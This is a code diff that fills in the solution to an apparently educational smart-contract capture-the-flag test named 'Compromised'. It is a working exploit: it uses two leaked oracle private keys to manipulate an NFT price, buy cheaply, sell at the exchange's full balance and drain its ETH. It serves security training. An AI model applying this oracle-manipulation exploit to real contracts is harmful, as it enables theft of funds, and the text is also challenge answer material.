@@ -75,7 +75,42 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1 = vm.addr(pk1);
+        address source2 = vm.addr(pk2);
+
+        // 1. Set price to 0 using both compromised oracles
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 0);
+
+        // 2. Buy NFT for almost nothing (median is now 0, but buyOne requires msg.value > 0)
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        // 3. Set price to the exchange's full balance
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // 4. Approve and sell the NFT, draining the exchange
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+
+        // 5. Send all ETH to recovery
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success);
+        vm.stopPrank();
+
+        // 6. Restore original price so _isSolved passes
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
